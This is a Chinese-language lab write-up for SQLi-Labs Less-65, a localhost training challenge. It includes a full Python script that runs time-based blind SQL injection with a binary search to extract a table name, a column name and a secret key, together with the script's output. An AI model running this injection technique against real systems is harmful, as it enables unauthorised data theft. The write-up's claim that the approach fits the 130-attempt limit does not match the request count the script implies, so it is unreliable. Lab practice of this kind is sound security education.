1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入 Challenge 系列（最终关）
  • 题目名称：Less-65 (Challenge-12)
  • 提示：目标是从 challenges 库中提取密钥，限制 130 次尝试。无报错、无回显，闭合符为双引号加括号 ")。

2. 核心原理与前置分析

本关卡是 Challenge 系列的最后一关，机制与 L64 相同，属于纯时间盲注环境。

核心区别：闭合上下文变为 id=("$id")。构造 Payload 时需使用 ") 闭合。继续沿用二分法盲注脚本，并为了适配双引号闭合，在 Python 中采用外层单引号包裹 f-string 的形式避免语法冲突。

3. 操作步骤与代码解析

第一步：编写并运行最终版 Python 脚本

新建 final_65.py，核心逻辑如下：

import requests
import time

url = "http://localhost/sqli-labs-master/Less-65/"
delay_threshold = 1.5 

def check_true(payload):
    # 核心变化：双引号加括号闭合（外层用单引号包裹）
    full_url = f'{url}?id=1") and ({payload})--+'
    try:
        start = time.time()
        requests.get(full_url, timeout=10)
        return (time.time() - start) > delay_threshold
    except requests.exceptions.Timeout:
        return True

def get_char(expr, pos):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"if(ascii(substr({expr},{pos},1))>{mid},sleep(2),0)"
        if check_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return low

def extract(expr, length):
    result = ""
    for i in range(1, length + 1):
        code = get_char(expr, i)
        if code <= 32 or code > 126:
            break
        result += chr(code)
        print(f"\r[*] 当前结果: {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    print("[*] 开始 L65 时间盲注二分法提取（最后一关）...")
    
    print("[*] 正在提取表名...")
    table = extract("(select table_name from information_schema.tables where table_schema='challenges' limit 1)", 12)
    print(f"[+] 表名: {table}")
    
    print("[*] 正在提取密钥列名...")
    col = extract("(select column_name from information_schema.columns where table_schema='challenges' and column_name like 'secret%' limit 1)", 16)
    print(f"[+] 列名: {col}")
    
    print("[*] 正在提取最终密钥...")
    secret = extract(f"(select {col} from challenges.{table} limit 1)", 24)
    print(f"[+] 最终密钥: {secret}")

代码成分解析：

  • full_url = f'{url}?id=1") and ({payload})--+'：精准匹配 L65 的双引号+括号闭合上下文。
  • 时间差判定：利用 time.time() 计算请求耗时，大于 1.5 秒判定条件成立（True），有效过滤网络抖动。
  • 二分法循环：在 ASCII 码 32-126 范围内不断折半，快速逼近目标字符。

第二步：执行结果与提交

终端成功输出：表名 zngrvvatv6，列名 secret_MWPS，最终密钥 EKQCHG7RngIdNZ25NATJnrm0。

将最终密钥提交至页面底部输入框，页面弹出 CONGRATS YOU NAILED IT，通关成功。

4. 策略复盘

  • 闭环的自动化：时间盲注本质是“暴力穷举”，在限制 130 次尝试的环境下，盲目手工测试必然失败。以脚本驱动二分法，是唯一解。
  • 引号逃逸：在 Python 脚本中拼接带双引号的 SQL 语句时，必须灵活切换字符串的引号包裹方式，或使用转义符，避免产生语法错误。

5. 知识点总结

  • 时间盲注综合应用：结合闭合逃逸、睡眠函数、二分算法与 HTTP 请求延时分析。
  • 自动化脚本工程化：通过封装提取函数（extract）和字符推断函数（get_char），实现代码的高复用性。
